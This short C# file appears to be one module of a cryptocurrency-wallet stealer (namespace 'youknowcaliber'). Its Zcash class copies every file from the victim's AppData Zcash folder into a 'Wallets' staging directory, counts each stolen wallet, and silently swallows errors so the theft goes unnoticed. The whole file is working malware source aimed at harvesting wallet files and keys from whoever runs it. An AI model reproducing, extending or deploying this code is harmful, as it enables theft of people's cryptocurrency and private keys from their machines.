﻿using System;
using System.IO;

namespace youknowcaliber
{
	internal class Zcash
	{
		public static void ZecwalletStr(string directorypath)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppData + "\\Zcash\\").GetFiles())
				{
					Directory.CreateDirectory(directorypath + Zcash.ZcashDir);
					fileInfo.CopyTo(directorypath + Zcash.ZcashDir + fileInfo.Name);
				}
				Counting.Wallets++;
			}
			catch
			{
			}
		}

		public static int count = 0;

		public static string ZcashDir = "\\Wallets\\Zcash\\";
	}
}
